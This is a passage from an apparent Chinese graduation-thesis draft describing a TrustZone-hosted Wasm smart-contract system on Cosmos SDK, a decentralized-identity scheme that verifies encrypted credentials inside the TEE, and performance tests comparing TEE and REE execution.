id=\"选择性披露和零知识证明\">选择性披露和零知识证明</h2>\n<p>选择性披露（Selective\nDisclosure）指的是在隐私保护机制中，用户仅披露特定的敏感信息或属性，而不暴露完整的数据。一种常见的实现方法是通过默克尔树（Merkle\ntree）来确保信息的完整性。</p>\n<p>零知识证明（Zero-Knowledge Proof，简称ZKP）[The knowledge complexity\nof interactive proof-systems]\n是一种密码学协议，它允许证明方向验证方证明某个陈述或命题的真实性，而无需透露除“命题为真”之外的任何额外信息，即验证者在验证过程中不获得任何关于证明内容的具体知识。零知识证明的关键特性包括完备性（有效证明必被验证接受）、可靠性（虚假证明必被验证拒绝）和零知识性（验证过程中不泄露额外信息）。目前，零知识证明被广泛应用于隐私保护、匿名认证、区块链扩容和可信计算等领域。</p>\n<h2 id=\"cryptographic-primitives密码学原语\">Cryptographic\nPrimitives（密码学原语）</h2>\n<h3 id=\"非对称加密-ecdsaecdh-对称加密-aes\">非对称加密 ECDSA、ECDH &amp;\n对称加密 AES</h3>\n<h1 id=\"proposed-methods\">Proposed Methods</h1>\n<p>在本章节中，我们首先提出了一个基于 TrustZone 和 Wasm\n的安全智能合约架构，旨在实现高效、安全、易开发的链上隐私计算。该系统通过将智能合约执行环境部署在\nTrustZone\n的安全世界中，确保敏感数据的处理和合约逻辑的执行完全在硬件隔离环境下完成。同时，该设计使智能合约能够访问<strong>安全原语级别的指令</strong>，从而降低开发复杂度，提升隐私合约的可编程性和可用性。</p>\n<p>基于这一架构，我们开发了一个 <strong>DID\n智能合约模块</strong>，实现了去中心化身份（Decentralized Identity,\nDID）文档的构建、加密形式下的可验证凭证（Verifiable Credential,\nVC）校验等核心功能。值得注意的是，其中的加密 VC\n校验过程本质上是一种<strong>零知识证明的具体实现</strong>：验证者可以确认用户确实满足某些身份属性（如年龄等），却无法获得具体的明文内容，实现了在受限信任模型下的<strong>轻量级零知识交互</strong>。</p>\n<h2 id=\"trustzone-based-wasm-smart-contract-architecture\">TrustZone-Based\nWasm Smart Contract Architecture</h2>\n<p>该系统主要由两个核心组成部分构成：一是基于 Cosmos SDK\n构建的区块链节点，我们在其原有的交易处理与状态同步基础上，设计并实现了一个智能合约管理模块，用于支持合约的上传、实例化、调用和查询；二是部署于\nTrustZone\n安全世界中的智能合约执行模块，负责对敏感合约逻辑的执行与隐私数据的处理。两个模块通过跨域通信机制协同工作，实现了链上调度与链下可信执行的分层架构。</p>\n<h3 id=\"cosmos-区块链节点模块设计智能合约管理模块\">Cosmos\n区块链节点模块设计（智能合约管理模块）</h3>\n<p>本系统基于 Cosmos SDK\n【Cosmos】框架构建区块链节点，并在此基础上设计了一个专用于智能合约生命周期管理的自定义模块。该模块负责协调链上合约的部署、执行与状态查询，并承担与\nTrustZone 安全世界中合约执行引擎之间的通信桥梁作用。</p>\n<p>该模块主要包含以下四类功能：（1）合约上传：用户通过交易上传已预编译为\nAOT（Ahead-of-Time）格式的 WebAssembly\n字节码合约。与传统解释执行不同，AOT\n合约在部署前已完成静态机器码生成，具备启动速度快、资源占用低的特点【AOT】。链上模块接收字节码后，生成合约的唯一标识，并将字节码持久化存储于链状态中；（2）合约实例化：用户可通过交易请求对某个已上传的合约字节码进行初始化，并传入初始化参数。实例化过程中系统将为该合约创建一个新的“合约账户”，并调用合约内部定义的\n<code>instantiate</code>\n函数，完成合约状态的初始化与注册；（3）合约调用：用户可提交交易调用已部署的合约方法。每个合约实例的状态在链上是相互隔离的，合约之间无法直接访问彼此状态，保证了合约执行的封装性与安全性；（4）状态查询：用户可通过执行合约中的只读函数，查询某个合约实例的当前状态。与异步调用不同，状态查询为同步执行，直接从合约存储中读取结果返回给用户。</p>\n<p>在与 TrustZone 的协作过程中，Cosmos\n区块链节点模块负责将用户提交的合约调用请求进行格式转换和权限校验，并将构造好的执行参数通过安全通道传递至部署在\nTrustZone 安全世界中的 Trusted Application（TA）。在实现上，我们将 TA\nhost 侧的通信逻辑封装为一个标准化的 C 语言库，并通过 <code>cgo</code>\n接口将其嵌入到基于 Go\n语言实现的区块链节点模块中，使得主链逻辑可以以统一、透明的方式发起与安全世界的跨域调用。</p>\n<p>合约执行完成后，TA\n会将执行结果以结构化数据形式返回至普通世界，由链上模块进一步解析并处理相关状态更新。为了确保执行过程的一致性与事务完整性，我们将该模块与\nTendermint\n共识机制紧密集成，所有涉及合约状态变更的交易均需经过共识确认后方可生效，从而保证了链上状态的可验证性与确定性。</p>\n<h3 id=\"wasm智能合约执行模块-smart-contract-execution-module\">Wasm智能合约执行模块\nSmart Contract Execution Module</h3>\n<p>为了适应 TrustZone 中受限的执行环境，我们在系统中选用了轻量级的 Wasm\n运行时 —— <strong>Wasm Micro Runtime (WAMR)</strong>\n作为合约执行引擎。WAMR 具备低内存占用和快速启动的特点，适用于资源受限的\nTEE 场景。WAMR 在本系统中的 TrustZone 部署方式借鉴了 WaTZ\n【WaTZ】。合约以 AOT 编译后的字节码形式由区块链节点传输至 TEE，并由 WAMR\n加载后按用户请求执行相应函数。</p>\n<p>在合约执行过程中，往往需要访问或修改链上状态数据。考虑到 TEE\n环境无法直接访问链上存储，我们设计了一套基于 <strong>共享内存与扩展 WASI\n接口</strong> 的通信机制。具体而言，我们在 REE（普通世界）与 TEE\n之间分配了一块共享内存，并将区块链节点进程划分为两个线程：一线程负责通过\n<code>TEEC_InvokeCommand</code>\n发起合约执行命令，另一线程持续监听共享内存的变化。</p>\n<p>当合约需要访问链上数据时，会调用扩展的 WASI\n接口，在共享内存中写入特定格式的请求结构。REE\n侧监听到共享内存变化后，便从区块链节点的存储中读取或修改目标数据，并将结果写回共享内存供\nTEE 使用。具体而言，我们将链上存储的读写逻辑以 Go\n语言实现，并将其编译为可由 C 语言调用的函数指针，作为回调函数注入至 TA\nhost\n侧的通信库。该机制支持按上下文与合约地址解析合约实例对应的存储空间，实现了对链上状态的精细化管理。</p>\n<p>为了支持隐私计算与链上可信交互，TA 模块内置了一系列安全原语，包括基于\nECDH 的共享密钥派生、AES 对称加解密、以及 ECDSA\n数字签名等加密操作接口。在区块链节点部署前，系统会将一个所有节点共享的私钥写入\nTA 的安全存储，用于后续的身份认证与密钥交换。该私钥受 TrustZone\n隔离保护，无法被外部访问或导出。合约可以通过调用扩展的 WASI\n接口访问上述安全原语功能。</p>\n<figure>\n<img src=\"/graduation-project/22/image-20250409195400465.png\" alt=\"image-20250409195400465\">\n<figcaption aria-hidden=\"true\">image-20250409195400465</figcaption>\n</figure>\n<h2 id=\"decentralized-identity-system-design\">Decentralized Identity\nSystem Design</h2>\n<p>本系统基于前述的区块链架构，构建了一个支持零知识属性验证的去中心化身份系统（DID\nSystem）。该系统结合链上智能合约与 TEE\n隔离执行能力，支持DID身份注册、可验证凭证（Verifiable Credential,\nVC）的颁发与隐私验证。系统中主要参与方包括：用户（User）、凭证发行者（Issuer）、验证者（Verifier）与\nDID 智能合约。</p>\n<h3 id=\"did-注册\">DID 注册</h3>\n<p>在系统中，用户需在本地生成<strong>两对非对称密钥对</strong>：一对用于身份认证中的数字签名，另一对用于与合约之间的密钥交换。所有密钥均基于椭圆曲线\n<strong>prime256v1</strong>（即 NIST\nP-256）生成，兼具安全性与较好的计算性能，适用于移动端和嵌入式设备\n【引用】。</p>\n<p>用户将这两对密钥中的公钥提交至链上的 DID\n智能合约进行注册。合约在接收到公钥后，会生成一份 <strong>DID\n文档</strong>，其中包含用户的签名公钥和密钥交换公钥，并将该文档持久化存储在链上状态中，供后续身份验证和凭证校验使用。注册成功后，合约将返回一个唯一的\nDID 标识符（Decentralized\nIdentifier），用于在系统中标识用户身份，绑定其链上操作与相关凭证。</p>\n<h3 id=\"vc-颁发\">VC 颁发</h3>\n<p>在 VC\n的颁发阶段，凭证发行者（Issuer）通常为具有公信力的权威机构，如政府、学校或金融服务机构。系统默认该发行者已具备对用户真实身份的审核能力，而<strong>发行者获取用户真实身份信息的过程并非本系统关注的范畴</strong>。</p>\n<p>发行流程开始时，发行者向用户发送一次性挑战（challenge），用于确认用户对\nDID\n的所有权。用户使用其本地持有的签名私钥对挑战进行签名，并将签名结果返回。发行者随后从链上读取用户的\nDID\n文档，提取公钥验证签名的合法性，以此确认请求者与链上注册身份的一致性。</p>\n<p>身份确认完成后，发行者根据其掌握的用户信息生成一份\nVC，内容可能包括用户的姓名、年龄、住址等身份属性。该 VC\n在生成后直接交付给用户本地存储，而<strong>不会上链或公开发布</strong>。</p>\n<h3 id=\"vc-验证\">VC 验证</h3>\n<p>为保障用户身份凭证的隐私性，同时支持验证方对关键属性的可信校验，本系统设计了一种零知识证明验证方法。该流程使得验证者能够在不知晓\nVC 明文内容的前提下，判断用户是否满足某个属性条件（例如“年龄 ≥\n18”）。</p>\n<p>验证过程包括如下步骤：</p>\n<ol type=\"1\">\n<li><strong>身份验证</strong>：与 VC\n颁发阶段类似，验证者需要利用一次性挑战确认用户对 DID 的所有权。</li>\n<li><strong>共享密钥生成与加密\nVC</strong>：用户使用自己的密钥交换私钥与链上的公钥（与系统部署时写入\nTEE 对应）执行 ECDH\n协议，协商出一组对称加密密钥。随后，用户使用该共享密钥对其本地存储的 VC\n内容进行 AES 加密，并将密文发送给验证者。</li>\n<li><strong>验证请求提交</strong>：验证者将接收到的加密 VC 与用户 DID\n一并提交至链上 DID 智能合约模块，发起 VC 验证请求。</li>\n<li><strong>TEE\n内部解密与校验</strong>：区块链节点接收到请求后，将调用合约执行模块。系统通过TEE中存储的私钥与用户DID文档中的公钥执行\nECDH 协议，重构出一致的共享密钥。随后使用共享密钥解密 VC，并验证 VC\n中记录的 DID\n与请求用户是否匹配，若一致则进一步判断指定属性（如年龄）是否满足验证条件。</li>\n<li><strong>返回验证结果</strong>：TA 将验证结果（通过 /\n拒绝）返回给验证者。整个过程中，验证者始终无法获取 VC\n的明文内容，也无法从交互中反推出用户的真实身份属性。</li>\n</ol>\n<p>该流程在无需构建复杂电路或生成加密证明的前提下，实现了零知识性质的属性验证，尤其适用于移动端、IoT\n等受限环境下的轻量级隐私计算场景。</p>\n<figure>\n<img src=\"/graduation-project/22/image-20250409141626140.png\" alt=\"image-20250409141626140\">\n<figcaption aria-hidden=\"true\">image-20250409141626140</figcaption>\n</figure>\n<figure>\n<img src=\"/graduation-project/22/image-20250409141744802.png\" alt=\"image-20250409141744802\">\n<figcaption aria-hidden=\"true\">image-20250409141744802</figcaption>\n</figure>\n<p><a href=\"../../../../../Downloads/时序图.pdf\">时序图.pdf</a></p>\n<p>本系统构建与 Cosmos 区块链框架之上。为了支持</p>\n<p>该系统被分为几个部分：</p>\n<ol type=\"1\">\n<li>Cosmos区块链节点：负责wasm智能合约原始的aot字节码的保存、智能合约实例化、字节码的查询等。</li>\n<li>智能合约执行模块：在区块链节点调用智能合约之后，可以能够向</li>\n</ol>\n<p>OP-TEE将系统分为\n安全世界和普通世界，普通世界里部署节点除了执行智能合约以外的功能，安全世界负责执行智能合约。</p>\n<p>智能合约可以通过任意语言编写（C、C++、Rust等）只要可以调用预留给wasm智能合约的外部wasi接口。</p>\n<p>要部署一个智能合约：</p>\n<ol type=\"1\">\n<li>上传编译成 aot 格式的字节码。</li>\n<li>实例化字节码，（此时会执行智能合约的实例化initialize函数）得到智能合约的账户地址。</li>\n<li>向这个账户地址发起执行或查询请求。</li>\n</ol>\n<p>调用智能合约时：</p>\n<ol type=\"1\">\n<li>把aot字节码拷贝到 TEE 中。</li>\n<li>TEE 中初始化 Wasm 运行时（WAMR）。</li>\n<li>WAMR 执行对应的函数。\n<ol type=\"1\">\n<li>执行过程中，可能需要获取链上数据。Wasm 通过 wasi ，在 TEE\n中的共享内存写入请求。</li>\n<li>REE\n中始终有一个线程在监听共享内存，发现请求后处理请求。可能是获取状态、修改状态等。</li>\n<li>处理完成后，结果写入共享内存。</li>\n<li>Wasm 发现共享内存中有得到反馈了，继续执行后续操作。</li>\n<li>执行完成，返回结果。</li>\n</ol></li>\n</ol>\n<h2 id=\"wasm-智能合约\">Wasm 智能合约</h2>\n<p>通过 wasi 与 OP-TEE OS 中的 API 进行交互，让智能合约可以直接进行\nOPTEE\n的安全操作（如私钥签名、秘钥交换等），大大降低智能合约开发难度。</p>\n<h2 id=\"did系统-可验证凭证的零知识证明\">DID系统 &amp;\n可验证凭证的零知识证明</h2>\n<p>基于上述系统，就可以实现可验证凭证的零知识证明了。</p>\n<ol type=\"1\">\n<li>用户在本地创建密钥对，本地保存私钥。</li>\n<li>用户将公钥发送给DID合约，创建DID。（链上保存DID文档，DID文档里包含用户的公钥用作身份验证，返回DID）</li>\n<li>VC Issuer（发行者，如政府）给用户创建可验证凭证（VC）\n<ol type=\"1\">\n<li>VC Issuer 提供挑战，用户用私钥签名挑战。</li>\n<li>VC Issuer 从链上获取用户的 DID\n文档，提取用户公钥，验证签名是否正确，验证用户身份。</li>\n<li>验证通过后，VC Issuer 创建 VC\n（包含用户的身份数据，如年龄、姓名、住址等）</li>\n</ol></li>\n<li>用户想要向 Verifier 证明自己的某个身份信息（如年满18岁），但是不想让\nVerifier 得知真实年龄和其他身份数据\n<ol type=\"1\">\n<li>Verifier 提供挑战，用户用私钥签名挑战。</li>\n<li>Verifier 从链上获取用户的 DID\n文档，提取用户公钥，验证签名是否正确，验证用户身份。</li>\n<li>验证通过后，等待用户提供证明。</li>\n<li>用户获取链上公钥，与自己的私钥进行 ECDH\n共享密钥协商，得到共享密钥。</li>\n<li>用户使用共享密钥，通过 AES 对称加密 VC。</li>\n<li>用户将加密后的 VC 发送给 Verifier。</li>\n<li>（Verifier 无法通过加密 VC 得知用户的任何个人信息。）Verifier\n将加密VC发送给DID合约，验证用户年龄是否已满18岁。</li>\n<li>DID合约收到加密VC和用户的DID，从链上获取 DID\n文档，提取用户公钥，与安全世界内的私钥做 ECDH\n共享密钥协商，得到共享密钥。</li>\n<li>DID合约用共享密钥解密VC，验证这个VC是否是用户本人的。（查看DID是否一致）</li>\n<li>如果是，继续验证VC中的年龄信息是否已满18.</li>\n<li>返回验证结果</li>\n</ol></li>\n</ol>\n<h1 id=\"性能测试\">性能测试</h1>\n<p>首先环境介绍，Linux22.04，QEMUv8，虚拟机。OP-TEE v4.3.0</p>\n<p>为了测试TrustZone对wasm智能合约执行模块的性能影响，设计如下性能测试方案：</p>\n<ol type=\"1\">\n<li>将 wasm 智能合约模块移动到 ree 中</li>\n<li>设计一个不涉及安全原语操作的简单智能合约（counter，仅包含两个功能：修改计数器，获取计数器），因为要在REE中运行智能合约，无法执行安全原语</li>\n<li>同时启动多个客户端，连续5分钟不停的向区块链发送查询和交易，统计每次查询和交易执行的时间（lantency），计算吞吐率（query\nper second, tx per second）</li>\n</ol>\n<p>query和tx的情况略有不同。tx在每次出块前统一执行（出块时间约3s），query因为不需要修改链上状态，可以实时获取结果。</p>\n<p>我的实验和TZ4Fabric的实验都表明（这里要提及TZ4Fabric吗？），每次实行智能合约中\nTEEC_OpenSession 的占据了大量的运行时间 。</p>\n<p>于是，我将打开Session的 tee_ctx\n的变量全局保存，每执行智能合约直接使用。</p>\n<p>实验结果如图：query的吞吐率对比，query的延迟对比，tx的吞吐率对比，tx的延迟对比</p>\n<p>吞吐率用折线图，延迟用柱状图。</p>\n<p>结果分析：可以发现，query\n延迟约提高了两倍，吞吐率变为原来的50%。tx在并发数量较少时，与REE中的数据相比影响较小，吞吐率微微降低，延迟微微提高。但是一个出块时间内能处理的交易数量有限，所以吞吐率有上限。并发量较大时，一些交易会被延迟到几个区块后才被处理，导致平均交易延长。当并发交易数量较多时，观察到吞吐率达到5\ntps 后无法再上涨。REE 中的执行速度更快，这个极限的值更大。</p>\n<p>想要与 TZ4Fabric 的结果进行对比，来观察 TrustZone\n对智能合约执行性能的影响。但是，我的系统与TZ4Fabric使用的区块链不同，智能合约不同，智能合约执行方式也不同，不太好直接对比吞吐率和延迟。但是可以用\n吞吐率下降率、延迟提高率\n来对比。（这里给出公式，怎么计算吞吐率下降率）</p>\n<p>下面列一个表格，列出我的方案和 TZ4Fabric 方案的吞吐率率的对比。</p>\n<p>和 TZ4Fabric 对比\n性能减少的百分比。4个并发时已经变为了50%，32并发时已经变为了原来的20%。</p>\n<p>而我的方案4个并发时性能几乎没有减少，32个方案时才变为50%。</p>\n<p>第二部分，给 DID 单独进行</p>\n<hr>\n<h2 id=\"实验设置与测试方案\">6.1 实验设置与测试方案</h2>\n<p>本实验在 Ubuntu 22.04 宿主机上部署基于 QEMU v8.1.2 的 ARMv8\n虚拟化环境，TEE 运行环境为 OP-TEE v4.3.0，模拟平台支持 ARM TrustZone\n执行模式。QEMU 中配置双核处理器、1GB 内存，启用了 <code>secure=on</code>\n模式以支持安全世界的模拟。整个系统包括运行于普通世界（REE）中的区块链节点与运行于安全世界（TEE）中的智能合约执行模块，两者之间通过共享内存进行通信。</p>\n<p>实验评估主要包括两个部分：<strong>第一部分评估 TrustZone 对 Wasm\n智能合约执行性能的影响</strong>，通过对比合约在 TEE 与 REE\n中执行的性能差异，衡量硬件隔离机制带来的性能开销；<strong>第二部分评估\nDID 智能合约模块中三个核心功能的执行性能</strong>，即 DID 注册、DID\n文档获取 与 VC\n验证，进一步验证系统在隐私身份应用场景下的实用性与效率。</p>\n<p>在第一部分中，为便于对比，我们将 Wasm 合约运行时分别部署于 TEE 与 REE\n中，并使用一个不涉及任何安全原语的轻量级测试合约（计数器合约）作为测试对象。该合约仅包含两个函数：计数器自增与读取当前值，具有良好的计算稳定性和低依赖性。在保证其他系统组件一致的前提下，我们对比分析两种部署模式下的合约调用延迟与吞吐率，反映硬件隔离对执行性能的影响。</p>\n<p>在第二部分测试中，我们逐一调用 DID 合约的三个主要功能接口，记录其在\nTEE 中的执行延迟，用以评估本系统在零知识式身份校验任务中的处理能力。</p>\n<p>所有交易与查询请求均通过 Cosmos SDK 提供的 RPC 接口完成，采用 REST\n协议发送 JSON 格式请求。在客户端模拟方面，我们在宿主机上运行基于\nJavaScript\n编写的测试脚本，模拟多个客户端同时发起请求。实验设置中，客户端并发数从 1\n逐步增加至 32，在每组配置下持续运行 5\n分钟并记录全过程的交易延迟与吞吐率。合约请求覆盖两类操作：状态查询与状态变更，分别用于测试读取路径与写入路径的性能瓶颈。</p>\n<h2 id=\"section\">6.2</h2>\n<figure>\n<img src=\"/graduation-project/22/line-smooth-5239037.png\" alt=\"line-smooth\">\n<figcaption aria-hidden=\"true\">line-smooth</figcaption>\n</figure>\n<figure>\n<img src=\"/graduation-project/22/line-smooth%20(1)-5239037.png\" alt=\"line-smooth (1)\">\n<figcaption aria-hidden=\"true\">line-smooth (1)</figcaption>\n</figure>\n<figure>\n<img src=\"/graduation-project/22/line-smooth%20(2)-5239037.png\" alt=\"line-smooth (2)\">\n<figcaption aria-hidden=\"true\">line-smooth (2)</figcaption>\n</figure>\n<figure>\n<img src=\"/graduation-project/22/line-smooth%20(3)-5239037.png\" alt=\"line-smooth (3)\">\n<figcaption aria-hidden=\"true\">line-smooth (3)</figcaption>\n</figure>\n<p>在本节中，我们从状态查询（query）和交易提交（tx）两个维度，评估智能合约执行过程中\nTrustZone 引入的性能开销。</p>\n<p>在 Cosmos SDK\n的运行机制中，交易执行（tx）是在每次出块前统一进行，出块时间固定为约 3\n秒，因此交易吞吐率受出块频率的物理上限所约束。而状态查询（query）操作并不修改链上状态，允许链节点实时返回结果，具有更强的并发响应能力。因此我们分别测量两类请求在不同并发负载下的吞吐率与平均响应延迟，并分别在\nTEE 和 REE 环境下对比结果。</p>\n<p>实验过程中发现，无论在 TEE 中执行何种合约逻辑，首次调用均需通过\n<code>TEEC_OpenSession</code>\n建立安全会话，该操作在每次交易中都造成了明显的性能开销。这一现象与\nTZ4Fabric 的实验结论一致，其性能瓶颈亦主要集中于 Trusted Application\n会话初始化操作上。为缓解该问题，我们将合约执行过程中所需的\n<code>TEEC_Context</code> 与 <code>TEEC_Session</code>\n全局缓存，避免每次调用重复建立会话，从而降低了频繁调用带来的额外开销。</p>\n<p>图 1 展示了本系统在不同并发数量下的状态查询与交易执行性能表现。图 1\n和图 2 分别为查询操作在 TEE 与 REE 下的吞吐率与延迟对比，图 3 和图 4\n则展示了交易操作的对比结果。</p>\n<p>从实验结果中可以观察到：</p>\n<ul>\n<li>对于查询操作，TEE 环境下的平均延迟为 REE 的两倍以上，吞吐率约为 REE\n的 47%。</li>\n<li>对于交易操作，在并发数量较小时，TEE 引入的性能影响较小，吞吐率与 REE\n相近，延迟略有上升。但随着并发数增加，交易积压显现，由于每个区块能处理的交易数量有限，部分交易会被延迟至后续区块执行，导致平均交易延迟上升，吞吐率最终稳定在约\n5 TPS 左右。相比之下，REE\n模式下吞吐率上限更高，能承载更多交易请求。</li>\n</ul>\n<p>为进一步分析 TrustZone 架构对合约性能的影响，我们尝试与 TZ4Fabric\n系统进行对比。但由于两系统在底层区块链平台、合约语言实现、执行模型与硬件平台方面存在显著差异，直接比较原始的吞吐率与延迟数据并不公平。为更合理地反映\nTEE 架构引入对系统性能的影响，本文采用以下两个相对性能变化率指标：</p>\n<ul>\n<li><strong>吞吐率下降率（Throughput Degradation Rate,\nTDR）</strong>：</li>\n</ul>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.927ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"21.514ex\" height=\"4.988ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1353 9509.1 2204.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"44\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H228Q399 682 419 682T461 676Q504 667 546 641T626 573T685 470T708 336Q708 210 634 116T442 3Q429 1 228 0H27V46H60Q102 47 111 49T130 61V622ZM593 338Q593 439 571 501T493 602Q439 637 355 637H322H294Q238 637 234 628Q231 624 231 344Q231 62 232 59Q233 49 248 48T339 46H350Q456 46 515 95Q561 133 577 191T593 338Z\" transform=\"translate(722,0)\"/><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\" transform=\"translate(1486,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(2499.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(3555.6,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(2372.7,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3373,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(722,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" 